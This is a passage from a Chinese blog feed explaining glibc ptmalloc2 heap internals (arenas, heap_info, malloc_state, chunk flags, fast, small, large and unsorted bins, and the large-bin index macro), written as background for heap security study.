src="https://cata1oc.github.io/2022/08/08/%E5%A0%86%E5%9F%BA%E7%A1%8003-free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/heap_trim.png"></p><ul><li>首先判断释放的内存大小是否超过了阈值 FASTBIN_CONSOLIDATION_THRESHOLD（0x10000），<ul><li>如果没超过，则不作处理</li><li>如果超过了，那么会先触发 fast bin 合并机制<ol><li>若 fast bin 存在，则调用 <code>malloc_consolidate()</code> 将 fast bin 进行合并</li><li>然后作进一步判断：<ul><li><strong>如果 free 的 chunk 位于主配分区（main_arena），且未设置 MORECORE_CANNOT_TRIM（不允许收缩内存），且 top chunk 的大小超过了 top chunk 的收缩阈值，那么就会调用 <code>systrim()</code> 收缩内存</strong></li><li><strong>如果 free 的 chunk 位于非主分配区（thread_arena），那么找到分配区（malloc_state）对应的堆（heap_info），然后调用 <code>heap_trim()</code> 收缩堆</strong></li></ul></li></ol></li></ul></li><li>最后判断一下如果是多线程的 free 情形，则将先前对分配区加的锁给去掉</li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://cata1oc.github.io/2022/08/08/%E5%A0%86%E5%9F%BA%E7%A1%8003-free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">堆基础03：free源码分析 | cataLoc’s Blog</a></li><li><a href="https://bbs.pediy.com/thread-271316.htm">看雪：malloc源码分析</a></li><li><a href="https://bbs.pediy.com/thread-272416.htm">看雪：how2heap深入浅出学习堆利用</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/04/09/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90_ptmalloc%E5%88%9D%E6%8E%A2/"/>
      <url>/2023/04/09/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90_ptmalloc%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>源码分析一共分为三个篇章，此篇为第一篇，主要介绍malloc中一些主要的数据结构，为之后第二第三篇的malloc和free的分析进行知识铺垫。</li><li>关于源码的分析皆来自64位的Ubuntu，glibc版本为2.31。</li><li>本篇内容基于<a href="https://cata1oc.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">cataLoc</a>师傅的博客分析（基本都是师傅分析的东西），部分师傅没分析的小函数采用chatgpt进行分析（真好用只能说）。</li></ul><h1 id="堆管理"><a href="#堆管理" class="headerlink" title="堆管理"></a>堆管理</h1><p>Linux提供了两种堆空间分配的方式，一个是brk系统调用，另一个是mmap系统调用。</p><img src="https://cata1oc.github.io/2022/06/30/%E5%A0%86%E5%9F%BA%E7%A1%8001-ptmalloc2%E5%88%9D%E6%8E%A2/memspace_1.png" title="" alt="" data-align="center"><p>这时就可以祭出这张经典内存空间的图了，可以看出：</p><ul><li>Heap，向上扩展的内存是由<mark>brk</mark>系统调用分配的堆空间。</li><li>Memory Mapping Segment，向下扩展的内存是由<mark>mmap</mark>分配的，其中包含着文件映射和匿名映射。<em>（这块内存中并不是连续的，其中有着很多空闲空间，mmap分配时就会在这些缝隙中调用）</em></li></ul><h2 id="brk-x2F-sbrk"><a href="#brk-x2F-sbrk" class="headerlink" title="brk&#x2F;sbrk"></a>brk&#x2F;sbrk</h2><ul><li><p>brk简而言之就是指定地址进行扩充</p><p><code>brk()</code> sets the end of the data segment to the value specified by addr, when that value is reasonable, the system has enough memory, and the process does not exceed its maximum data size</p></li><li><p>sbrk就是指定要增加的数据大小来进行扩充</p><p><code>sbrk()</code> increments the program’s data space by increment bytes. Calling <code>sbrk()</code> with an increment of 0 can be used to find the current location of the program break.</p></li></ul><h2 id="mmap-x2F-munmmap"><a href="#mmap-x2F-munmmap" class="headerlink" title="mmap&#x2F;munmmap"></a>mmap&#x2F;munmmap</h2><p>看一下函数原型</p><pre><code class="c">void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);int munmap(void *addr, size_t length);</code></pre><ul><li><p><code>mmap()</code>用于在进程的虚拟地址空间中创建一个新的映射，并将文件或设备映射到这块内存中</p><ul><li><p>addr：指定映射的起始地址，若该参数为NULL时，则由操作系统自己决定mapping的起始地址</p></li><li><p>length：指定映射的大小，该值必须大于0</p></li><li><p>prot：描述这段映射的内存保护属性，且不能与打开文件时设置的访问模式相冲突</p></li><li><p>flags：这个字段指定了mapping的一些行为属性，例如是否修改原本被映射的文件，对于映射到同一块区域的其它进程是否可见等等。其中，<strong>当设置了<em>MAP_ANONYMOUS</em>属性后，这块地址空间将不会映射到任何文件，其内容将会被初始化为0，我们称这块空间为匿名（Anonymous）空间，匿名空间可以用来作为堆空间。</strong> 此时，fd参数将会被忽略，offset参数应设置为0</p></li><li><p>fd：指向将被映射到内存中的文件对象</p></li><li><p>offset：被映射内容在文件中的起始偏移，该值必须是页（4KB）的整数倍</p></li></ul></li><li><p><code>munmap</code>则用于删除指定地址范围内的映射</p></li></ul><p>在[cataloc](<a href="https://cata1oc.github.io/2022/06/30/%E5%A0%86%E5%9F%BA%E7%A1%8001-ptmalloc2%E5%88%9D%E6%8E%A2/#mmap-munmap">堆基础01：ptmalloc2初探 | cataLoc’s Blog</a>)师傅的博客中有关于brk和mmap的详细例子，可以直观看到两者的区别和具体在内存的什么位置进行申请，这里不再赘述。</p><h1 id="ptmalloc2分配策略"><a href="#ptmalloc2分配策略" class="headerlink" title="ptmalloc2分配策略"></a>ptmalloc2分配策略</h1><h2 id="多线程实现"><a href="#多线程实现" class="headerlink" title="多线程实现"></a>多线程实现</h2><p>ptmalloc是基于dlmalloc改进，实现了多线程的堆分配器，其中的<code>pt</code>代表着<em>per thread</em>，并随着时间发展为ptmalloc2。</p><p>为了支持多线程并行处理时对于内存的并发请求操作，malloc 的实现中把全局用户堆（heap）划分成很多子堆（sub-heap）。这些子堆是按照循环单链表的形式组织起来的。每一个子堆利用互斥锁（mutex）使线程对于该子堆的访问互斥。当某一线程需要调用 malloc 分配内存空间时，该线程搜索循环链表试图获得一个没有加锁的子堆。如果所有的子堆都已经加锁，那么 malloc 会开辟一块新的子堆，对于新开辟的子堆默认情况下是不加锁的，因此线程不需要阻塞就可以获得一个新的子堆并进行分配操作。在回收 free 操作中，线程同样试图获得待回收块所在子堆的锁，如果该子堆正在被别的线程使用，则需要等待直到其他线程释放该子堆的互斥锁之后才可以进行回收操作。</p><h2 id="分配策略"><a href="#分配策略" class="headerlink" title="分配策略"></a>分配策略</h2><p>ptmalloc2 会在第一次执行 malloc 的时候向操作系统申请 0x21000B（132KB），后续分配就不会向操作系统申请内存，而是会从这块132KB的堆里面进行分割小块，直到用完的时候才会再次申请内存。</p><p>接下来看具体的分配策略，<strong>首先根据申请的字节大小，系统选择一个合适的 chunksize 作为需要分配的 chunk 大小</strong>，这个 chunksize 会通过特定的宏操作计算得出，比方说，<strong>chunksize 至少为 0x20 字节，这个大小的 chunk 最多可以容纳 0x10 字节的数据，那么当申请的空间小于等于 0x10 字节时，ptmalloc2 就会分配一个大小为 0x20 字节的 chunk</strong>。</p><p>这里解释下为什么 chunksize 至少为 0x20 字节，malloc_chunk 本身包含四个字段。</p><ul><li><p>prev_chunksize（8字节）</p></li><li><p>chunksize（8字节）</p></li><li><p>fwd（8字节）</p></li><li><p>bck（8字节）</p></li></ul><p>其中 chunksize 描述的是整个 chunk 的大小，包含这4个字段和数据；另外，当 chunk 被使用时，fwd 和 bck 两个字段是不使用的，因为它们仅在链式管理时使用(<em>当 chunk 放入 bin 中，也意味着这个 chunk 此时是空闲的，暂时不使用了</em>)，当 chunk 正在被使用时，这两个字段是用不到的，自然就可以用来存储数据了，也就是说，原本 malloc_chunk 结构体中两个用来存放指针的空间，可以用来存放数据，大小为 0x10 字节。</p><p><strong>不过，当你申请的大小为0x10和0x18这个范围时，你会发现给你分配的chunk大小依旧为0x20，这是因为，相邻的下一个chunk的头部，prev_chunksize给以给上一个chunk存储数据，因为这个字段是用来存放上一次空闲块的大小，不空闲的话就给他用用，邻里友善了属于是。所以可知，当你申请的chunk对齐后多出来的字节小于等于8字节的话，都是放下一个chunk的prev_chunksize。具体函数分析在下一篇的源码中再谈</strong></p><p>计算出需要分配多大的 chunk 以后，就会开始去不同的 bin 中查找符合条件的 chunk：</p><ol><li>首先是 tcache bin，这是在 glibc2.26 开始引入的缓存机制，默认开启。<strong>如果申请的 chunksize 不属于 large bin，并且 tcache bin 已经初始化了，并且 tcache bin 中有对应的大小的 chunk 块</strong>，那么就会直接从 tcache bin 中取出这个 chunk 拿去用。从 tcache bin 中取出 chunk 的操作是发生在调用<code>_int_malloc()</code>之前的，是最先发生的操作</li><li>接下来会进入<code>_int_malloc()</code>，这是实现 malloc 的核心函数。进入后会先判断 chunksize 是否属于 fast bins，如果属于就去 fast bins 里面找，<strong>fast bins 的判断是严格匹配的，如果 chunksize 是 0x30 字节，那就在 fast bins 中找空闲的 0x30 字节的 chunk。</strong></li><li>fast bins 没有找到合适的，则判断 chunksize 大小是否位于 small bin 的范围区间，如果符合，就会去 small bin 里面找，small bin 包含 62 条 bin 链，和 fast bins 类似，small bin 的每条 bin 链中的 chunk 大小是相同的，因此直接在对应 chunksize 的 bin 链中找就行，同样也是严格匹配 chunksize</li><li>如果在申请的 chunksize 大小位于 large bin 范围区间（或者在 fast bins 和 small bin 中未能找到合适的 chunk），则会先将 fast bins 中的 chunk 合并，插入到 unsorted bin 中，接下来<strong>遍历 unsorted bin 中的所有 chunk，同时将遍历到的 chunk 从 unsorted bin 上摘下，看这个 chunk 的大小是否符合申请的 chunksize，如果符合，就将这个 chunk 返回给用户。否则，就根据这个 chunk 的 chunksize 将其放入 small bin 或者 large bin 中</strong>。但实际从代码来看的话，该流程是找到合适大小符合chunksize的话，会先将其放入tcache中（<em>如果满了直接返回给用户</em>），<code>return_cached</code> 会被设置为1，之后继续遍历剩下的chunk，挨个遍历完后，如果这个过程有找见对于大小的chunk，就会从tcache中拿出返回给用户。</li><li>这里还有一点很重要，在遍历 unsorted chunk 开始处有一个判断条件，<strong>会判断申请的是否为 small chunk（前面判断的 small bin 中的 chunk，这里判断是 unsorted bin 中属于 small bin 范围区间的的 chunk，即尚未分配到 small bin 中的一个 chunk），且 unsorted bin 中只有一个 chunk，且这个 chunk 为 last remainder chunk，且这个 chunk 满足所需的大小加上 0x20</strong>，如果满足这四个条件，则会尝试对这个 last remainder chunk 进行切割，参考下面（6）。切割后剩余的 chunk 仍然作为 last remainder chunk 存在</li><li>接下来，开始在 large bin 中寻找合适的 chunk，由于 large bin 的每个 bin 中的 chunk 大小是不一定相同的，所以在查找时，会先试图找到一个匹配申请的 chunksize 的 chunk。若找不到，就选择一个略微大一些的 chunk，然后<strong>判断这个 chunk 分割出 chunksize 后余下的 remainder chunk 是否能达到最小的 chunksize（即 0x20字节），如果可以达到，那就先分割，把 chunksize 的部分返回给申请的程序。余下的 remainder chunk 则链入 unsorted bin 中，当发生完这个操作后，该 remainder chunk 是最近一次被分割后得到的 chunk，因此又称作 last remainder chunk</strong>；如果 remainder chunk 达不到 0x20 字节，就不分割，把一整块返回给程序</li><li>前面提到的 small bin、unsorted bin、large bin 都属于 bins 中的一个或一组链表，下文会分析到 bins 中各个 bin 的组织结构。</li><li>如果说，在 large bin 中也没找到合适的 chunk，则会通过一个位图判断整个 bins 中是否包含符合申请 chunksize 要求的 bin 链，然后再在这个 bin 链上找是否有符合要求的 chunk，若有的话，则和 （6） 一样根据情况进行分割</li><li>如果 bins 中也没有符合要求的 chunk，则会去 top chunk 进行分割。这个 top chunk 位于一开始申请的 0x21000 字节的高地址处，它不属于任何 bin。如果 top chunk 的大小满足用户所需求的 chunk 大小，那么就会分割一块返回给申请的程序，但是余下的 remainder chunk 不会链入 unsorted bin 中，仍以 top chunk 的形式存在着</li><li>如果 top chunk 仍然不满足申请的 chunksize 需求，那么就会根据实际情况，通过<code>sbrk()</code>扩展 top chunk，或者调用<code>mmap()</code>分配新的堆</li></ol><h1 id="堆管理结构"><a href="#堆管理结构" class="headerlink" title="堆管理结构"></a>堆管理结构</h1><h2 id="分配区"><a href="#分配区" class="headerlink" title="分配区"></a>分配区</h2><p>前面提到，ptmalloc2 在实现多线程时，在 malloc 的实现中把全局用户堆（heap）划分成很多子堆（sub-heap），每一个子堆利用互斥锁使线程对于该子堆的访问互斥。这里 ptmalloc2 引入了 <strong>分配区(arena)</strong> 的概念，每个arena 本质上是完全不同的堆，他们独自管理自己的 chunk 和 bins。arena 分为 main_arena 和 thread_arena。malloc 内部通过<code>brk()</code>和<code>mmap()</code>系统调用来分配内存。每个进程只有一个 main_arena（称为主分配区），但是可以有多个 thread_arena（或者non_main_arena，非主分配区）。</p><ul><li><strong>main_arena</strong>：<ol><li>对应进程 heap 段，由<code>brk()</code>函数创建</li><li>分配区信息由 malloc_state 结构体存储</li><li>main_arena 的 malloc_state 结构体存储在该进程链接的 libc.so 的数据段</li><li>main arena 的大小可以扩展。</li></ol></li><li><strong>thread_arena</strong>：<ol><li>对应进程的 mmap 段，thread_arena 由<code>mmap()</code>函数创建</li><li>分配区信息由 malloc_state 和 heap_info 两个结构体存储</li><li>thread_arena 的 malloc_state 和 heap_info 存放在堆块的头部</li><li>thread_arena 的大小不可以扩展，用完之后需调用<code>mmap()</code>申请一个新的 thread_arena</li></ol></li></ul><h2 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h2><p><strong>heap_info 这个结构相当于 Heap Header</strong>，它是堆的管理结构之一。前面提到了 main_arena 和 thread_arena，其中 main_arena 是不需要 heap_info 结构体的（因为它只有一个堆），所以这里只需要关注它在 thread_arena 中的作用就行了。在非主分配区中是可能包含多个堆的，原因在于 thread_arena 中的堆是通过<code>mmap()</code>调用申请的，因此不能通过<code>brk()</code>进行扩展，当空间不足时，只能够再次调用<code>mmap()</code>申请新的堆空间，heap_info 就是管理这些通过<code>mmap()</code>申请出来的堆空间的，<strong>包括第一次申请的在内，thread_arena 申请的每个堆空间，都会对应一个 heap_info 来描述并管理这个堆</strong></p><img src="https://cata1oc.github.io/2022/06/30/%E5%A0%86%E5%9F%BA%E7%A1%8001-ptmalloc2%E5%88%9D%E6%8E%A2/heap_info_1.png" title="" alt="" data-align="center"><ul><li>ar_ptr：这个字段指向堆所在的分配区（arena），是一个 malloc_state 结构体，<strong>一个堆只能对应一个分配区</strong></li><li>prev：将同一个分配区（arena）中，堆的 heap_info 结构，用单向链表链接起来。这里 prev 指向链表中前一个堆对应的 heap_info</li><li>size：当前堆的大小</li><li>mprotect_size：当前堆还没有被分配的内存大小</li><li>pad：用于对齐的，不用关心</li></ul><h2 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h2><p><strong>malloc_state 相当于 Arena Header</strong>，前面提到 thread_arena 中的每个堆都对应一个 heap_info，这些所有堆共有一个 malloc_state，它用来<strong>表示分配区，位于整个分配区的头部</strong>。总结一下就是<strong>每个 thread_arena 对应一个 malloc_state，thread_arena 中的每个堆对应一个 heap_info</strong>。当然，malloc_arena 也对应一个 malloc_state，但是存储在该进程链接的 libc.so 的数据段中。</p><img src="https://cata1oc.github.io/2022/06/30/%E5%A0%86%E5%9F%BA%E7%A1%8001-ptmalloc2%E5%88%9D%E6%8E%A2/malloc_state_1.png" title="" alt="" data-align="center"><ul><li>mutex：用于串行化访问分配区（arena），当有多个线程访问同一个分配区时，第一个获得这个 mutex 的线程将使用该分配区分配内存，分配完成后，释放该分配区的 mutex，以便其它线程使用该分配区</li><li>flags：记录分配区的一些标志</li><li>have_fastchunks：标志位，判断 fast bin 最近是否有插入空闲块</li><li>fastbinsY：用来记录和管理 fast bin 的链表数组，每条都是单链表</li><li>top：指向 top chunk</li><li>last_remainder：指向 last remainder chunk</li><li>bins：包括 unsorted bin、small bin 和 large bin，具体参考下文介绍 bins 时的图，其中 NBINS 定义为 128</li><li>binmap：用于快速查找对应 index 的 bin 是否为空的一个位图</li><li>next：指向下一个 arena，arena 之间通过单循环链表构成</li><li>next_free：指向下一个空闲的 arena。<strong>这是一个链表（free_list），串着空闲的分配区（free_arena），访问这个链表上的空闲分配区，需要通过 free_list_lock 进行上锁</strong></li><li>attached_threads：附加到当前分配区的线程数。<strong>如果该值为 0，说明没有线程附加到该分配区，此时该分配区位于 free_list</strong>。这个 free_list 就是 next_free 指向的 free_list，它包含着还没有被线程附加的空闲分配区。对于多线程的程序，某个线程申请内存时，会试图从 thread_arena 中获取到分配区，在首次申请时，thread_arena 的尚未被初始化，值为 NULL。此时会进一步调用 <code>get_free_list()</code> 从 free_list 中找到一个尚未被附加的 free_arena 将其返回，同时将该 arena 从 free_list 上移除，并赋值给 thread_arena。这部分在分析<code>__libc_malloc()</code>时会再次提到。</li></ul><h2 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h2><p><strong>malloc_chunk 相当于 Chunk Header</strong>，就是前面提到用来描述一个内存块的结构，chunk 在不同状态下，所使用的字段及含义也不相同，这里以定义时的结构入手进行简单的解析。</p><img src="https://cata1oc.github.io/2022/06/30/%E5%A0%86%E5%9F%BA%E7%A1%8001-ptmalloc2%E5%88%9D%E6%8E%A2/malloc_chunk_1.png" title="" alt="" data-align="center"><ul><li>mchunk_prev_size：如果前一个（虚拟内存空间的位置相邻的前一个） chunk 是空闲的，则该字段表示前一个 chunk 的大小（通过当前 chunk 的地址，以及这个字段的值，就可以定位前一个 chunk 的地址，这样在 free 当前 chunk 时，发现前一个 chunk 也是空闲时，就会发生合并）。否则，该字段用于存储前一个 chunk 的数据，没错，<strong>当前一个 chunk 不空闲时，这个字段是不属于当前 chunk 的，而是作为前一个 chunk 的存储空间使用</strong></li><li>mchunk_size：表示当前 chunk 的大小，也记录了当前 chunk 和前一个 chunk 的一些属性</li><li>fd &amp; bk：这俩指针<strong>仅在当前 chunk 空闲时才存在</strong>，用于将 chunk 加入到对应的 bin 中进行统一的链式管理。<strong>若当前 chunk 正在被使用，则这两个指针的位置用于存放数据</strong></li><li>fd_nextsize &amp; bk_nextsize：这俩指针<strong>仅在当前 chunk 空闲时，且位于 large bin 中时才存在</strong>。其中 <strong>fd_nextsize 指向 size 比自身小的里面最大的 chunk，bk_nextsize 指向 size 比自身大的里面最小的 chunk</strong>，这部分可以参考后面 large bin 的图示。</li></ul><h2 id="主分配区和非分配区"><a href="#主分配区和非分配区" class="headerlink" title="主分配区和非分配区"></a>主分配区和非分配区</h2><img src="https://cata1oc.github.io/2022/06/30/%E5%A0%86%E5%9F%BA%E7%A1%8001-ptmalloc2%E5%88%9D%E6%8E%A2/single_heap.png" title="" alt="" data-align="center"><img src="https://cata1oc.github.io/2022/06/30/%E5%A0%86%E5%9F%BA%E7%A1%8001-ptmalloc2%E5%88%9D%E6%8E%A2/multi_heap.png" title="" alt="" data-align="center"><p>第一张图没什么好说的，展示了两者的区别。主要看第二张图发生的变化，在thread arena申请时，如果top chunk不够，由于mmap申请空间不可扩展的性质，这时候会申请新的堆，里面包含着heap_info，没有malloc_state，该结构体一个thread arena只有一个，heap info可以有多个。</p><h2 id="malloc-par"><a href="#malloc-par" class="headerlink" title="malloc_par"></a>malloc_par</h2><p>一个进程全局拥有一个唯一的 malloc_par 实例,主要关注其中记录的关于tcache的信息，在分配时会使用到。</p><img src="https://cata1oc.github.io/2022/06/30/%E5%A0%86%E5%9F%BA%E7%A1%8001-ptmalloc2%E5%88%9D%E6%8E%A2/malloc_par_1.png" title="" alt="" data-align="center"><ul><li>trim_threshold：top chunk 的收缩阈值</li><li>top_pad：在分配内存时是否添加额外的 pad，默认设置为0</li><li>mmap_threshold：mmap 分配阈值</li><li>arena_test：当进程的分配区数量小于等于 arena_test 时，不会重用已有的分配区</li><li>arena_max：当进程的分配区数量达到 arena_max 时，不会再创建新的分配区，只会重用已有的分配区</li><li>n_mmaps：当前进程使用 <code>mmap()</code> 分配的内存块的个数</li><li>n_mmaps_max &amp; max_n_mmaps：<code>mmap()</code>函数分配的内存块的最大数量</li><li>no_dyn_threshold：是否开启<code>mmap()</code>分配阈值动态调整机制，默认为0，即开启</li><li>mmaped_mem &amp; max_mmapped_mem：统计<code>mmap()</code>分配的内存大小，通常这两字段的值相等</li><li>sbrk_base：堆的起始地址</li><li>tcache_bins：tcache bin 的数量</li><li>tcache_max_bytes：最大 tcache chunk 的大小</li><li>tcache_count：每个 tcache bin 中 tcache chunk 的最大数量</li></ul><h1 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h1><p> chunk主要就是使用和空闲两种状态。</p><ul><li>已分配的（Allocated chunk）</li><li>空闲的（Free chunk）</li><li>Top chunk</li><li>Last Remainder chunk</li></ul><h2 id="Allocated-chunk"><a href="#Allocated-chunk" class="headerlink" title="Allocated chunk"></a>Allocated chunk</h2><img src="https://cata1oc.github.io/2022/06/30/%E5%A0%86%E5%9F%BA%E7%A1%8001-ptmalloc2%E5%88%9D%E6%8E%A2/allocated_chunk_1.png" title="" alt="" data-align="center"><p>这里唯一需要解释的就是 N、M、P 这三个标志位（这里能余下这 3 位是因为 chunk 大小按照 8 字节对齐）：</p><ul><li>N位：表示是否为 non_main_arena，若为1，则 chunk 属于 thread_arena</li><li>M位：表示该 chunk 是否通过<code>mmap()</code>申请的，若为1，则是</li><li>P位：表示 prev_inuse，若位1，说明前一个（虚拟内存空间的具体位置上的前一个）块正在被使用。即处于 Allocated 状态</li></ul><h2 id="Free-Chunk"><a href="#Free-Chunk" class="headerlink" title="Free Chunk"></a>Free Chunk</h2><img src="https://cata1oc.github.io/2022/06/30/%E5%A0%86%E5%9F%BA%E7%A1%8001-ptmalloc2%E5%88%9D%E6%8E%A2/free_chunk_1.png" title="" alt="" data-align="center"><p>Free Chunk 多出了 fd &amp; bk 这两个指针；若为 largin bin 中的 Free Chunk，则在紧接着fd、bk的地方还会多出 fd_nextsize &amp; bk_nextsize 这俩指针。</p><h2 id="Top-Chunk"><a href="#Top-Chunk" class="headerlink" title="Top Chunk"></a>Top Chunk</h2><p>一个 arena 顶部的 chunk 被称作 top chunk，它不属于任何 bin，其信息<strong>记录在 mstate 中</strong>（即 malloc_state 结构中）。当所有 bin 中都没有空闲可用的 chunk 时，便会切割 top chunk 来满足用户的内存申请。top chunk 在进行分配时也是通过切割，若空间足够，则会从 top chunk 上切割下程序申请大小的 chunk 返回给程序，余下部分，作为新的 top chunk 存在（这个新的 top chunk，在刚分割完时也被称作 last remainder chunk，但不会链入到 unsorted bin 中）。如果连 top chunk 都不够用，则会进行如下判断：</p><ul><li>如果位于 <strong>main_arena</strong> 中，通过<code>brk()/sbrk()</code>扩张 top chunk 的边界</li><li>如果位于 <strong>non_main_arena</strong>（即 thread_arena），则调用<code>mmap()</code>分配新的堆空间，<strong>通过 heap_info 数据结构将多个堆串连在一起</strong></li></ul><p><strong>注意：Top Chunk 的 PREV_INUSE 位总是1</strong></p><h2 id="Last-Remainder-Chunk"><a href="#Last-Remainder-Chunk" class="headerlink" title="Last Remainder Chunk"></a>Last Remainder Chunk</h2><p>Last Remainder Chunk 来源于最近一次的 split（切割） 操作。当程序申请的 mallocsize（这里用 mallocsize 表示程序申请的 chunk 大小） 落入 large bin 对应的范围区间时，若没有找到刚好合适的块，则会选择一个大于 mallocsize 的最小 chunk 进行分配。在分配该块时进行如下判断：</p><ul><li>如果 chunksize - mallocsize &gt;&#x3D; 0x20，则分割出 mallocsize 大小的 chunk 返回给用户，<strong>余下的 chunk 将会链入 unsorted bin 中，这个余下的 chunk，就被称作 last remainder chunk，表示最近一次由于 split 操作从而进入 unsorted bin 的 chunk</strong></li><li>如果 chunksize - mallocsize &lt; 0x20，直接将 chunk 返回给申请的程序，此时不存在 last remainder chunk</li></ul><p>之后当程序再次请求 small chunk 时，且 small chunk 中未能找到合适的 chunk 时，就会判断 last remainder chunk 是否为 unsorted bin 中的唯一块，如果是，那么 last remainder chunk 会被再次分割出 small chunk 返回给程序，余下的部分继续作为新的 last remainder chunk 存在。这样，当程序进行连续的小空间内存申请时，分配到的内存都是相邻的（last remainder chunk 周围） ，从而在 free 的时候就可能会与周围的空闲 small chunk 进行合并操作，达到了更好的局部性</p><h1 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h1><p>bin 是用来管理 free chunk 的链表，根据功能与 chunksize 的不同，可以分为：</p><ul><li>Fast Bin</li><li>Unsorted Bin</li><li>Small Bin</li><li>Large Bin</li><li>Tcache Bin</li></ul><h2 id="Fast-Bin"><a href="#Fast-Bin" class="headerlink" title="Fast Bin"></a>Fast Bin</h2><p>fast bin 顾名思义，当初设计时的定位为 bins 的高速缓冲区，主要用于提高小内存分配效率，放置在 fastbinsY 数组上。当用户释放&#x2F;申请一块不大于 global_max_fast 的 chunk 时，会优先考虑在 fast bin 上存放或从 fast bin 中找到是否存在合适的 chunk。它具备以下特点：</p><ul><li><p>fast bin 采用先进后出（FILO）的原则，每个 bin 只存储大小相同的 chunk，最多包含 10 个bin，范围为 0x20 ~ 0xB0</p></li><li><p>fast bin 是<strong>单向链表（因为它不会从中间摘下一个 chunk 出来，添加与删除只发生在单链表的首尾之间）</strong>，所以只用到了 malloc_chunk 结构的 fd 指针</p></li><li><p>fast bin 中 <strong>chunk 的 prev_inuse 位设为1，即永远被视为在使用中，这意味着相邻空闲 chunk 不会合并</strong>。它的匹配规则也是定量匹配，这在前面介绍分配策略时有提到。虽然这么做导致外部碎片增多，但是 free 效率提升</p></li><li><p>初始化堆时会默认设置 global_max_fast 的值为 0x80，此时 fast bin 只包含 0x20 ~ 0x80 范围的 chunk，大于 0x80 的 chunk 在释放时会进入 unsorted bin。调用 mallopt 设置 fast bin 的最大值，则 fast bin 可以包含最大为 0xB0 的 chunk</p></li></ul><img src="https://cata1oc.github.io/2022/06/30/%E5%A0%86%E5%9F%BA%E7%A1%8001-ptmalloc2%E5%88%9D%E6%8E%A2/fastbin_1.png" title="" alt="" data-align="center"><h2 id="Bins"><a href="#Bins" class="headerlink" title="Bins"></a>Bins</h2><p>首先 bins 是一个数组，数组中包含了 unsorted bin、small bin 以及 large bin，并且 bins 里面的 bin 都是双链表。</p><ul><li>unsorted bin：<ol><li>是 bins 的缓冲区，位于 bins 数组中的第一位，大小不同且没有限制，FIFO。</li><li><strong>当用户释放的 chunk 大于 global_max_fast 或 fast bin 进行合并后得到的 chunk，都会放入 unsorted bin 中</strong>，因此，unsorted bin 中的 chunk 大小是不同的</li><li>当用户申请的 chunk 在 fast bin 与 small bin 中无法通过定量匹配找到时，会先去 unsorted bin 查找是否有合适的 chunk；若没有，则会将 unsorted bin 上的 chunk 放入 small bin 或 large bin 中，然后再去 large bin 中找</li></ol></li><li>small bin：<ol><li>小于 0x400 字节（64位系统）的 chunk，位于 bins 数组的 2~63 位，共 62 条 small bin，small bin 采用的策略是先进先出（FIFO）</li><li>与 fast bin 类似，<strong>small bin 中每条 bin 存储的 chunk 也是大小相同的；不同的是它会参与合并，因此不存在两个相邻的 free chunk</strong></li><li>small bin 中每条 bin 之间的 chunk 大小相差 0x10 字节</li><li>small bin 起始 bin 的 chunk 大小为 0x20 字节（最大的chunk为1008字节，也就是3F0）</li></ol></li><li>large bin：<ol><li>大于等于0x400 字节（64位系统）的 chunk。位于 bins 数组的 64~126 位，共 63 条 small bin，分配策略复杂，之后具体分析过程时再说。</li><li><strong>large bin 中每条 bin 上的 chunk 大小不一定相同</strong>。大小相同的 chunk 用 fd&#x2F;bk 链接，不相同的用 fd_nextsize&#x2F;bk_nextsize 链接</li><li>每条 bin 之间 chunk 大小相差的字节也是变化的</li></ol></li></ul><h3 id="large-bin大小分析"><a href="#large-bin大小分析" class="headerlink" title="large bin大小分析"></a>large bin大小分析</h3><pre><code class="c">#define largebin_index_64(sz)                                                \  (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;&gt; 6) :\   ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;&gt; 9) :\   ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\   ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\   ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\   126)</code></pre><p>上面是通过大小寻找large bin下标所定义的宏，它将一个可用chunk的大小（以字节为单位）映射到large bin数组中的一个索引，以便在这个large bin中查找可用的chunk。</p><ol><li><p>如果 sz 右移 6 个比特（即除以 64）得到的结果小于等于 48，则 largebin 索引值为 48 加上这个结果。</p></li><li><p>否则，如果 sz 右移 9 个比特（即除以 512）得到的结果小于等于 20，则 largebin 索引值为 91 加上这个结果。</p></li><li><p>否则，如果 sz 右移 12 个比特（即除以 4096）得到的结果小于等于 10，则 largebin 索引值为 110 加上这个结果。</p></li><li><p>否则，如果 sz 右移 15 个比特（即除以 32768）得到的结果小于等于 4，则 largebin 索引值为 119 加上这个结果。</p></li><li><p>否则，如果 sz 右移 18 个比特（即除以 262144）得到的结果小于等于 2，则 largebin 索引值为 124 加上这个结果。</p></li><li><p>否则，largebin 索引值为 126。</p></li></ol><p>第一个chunk大小为0x400，其他大小具体可以表示为下图</p><img title="" src="https://s2.51cto.com/images/blog/202108/27/25d7ea3cf17b002918d4747656dc3d84.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=/format,webp/resize,m_fixed,w_1184" 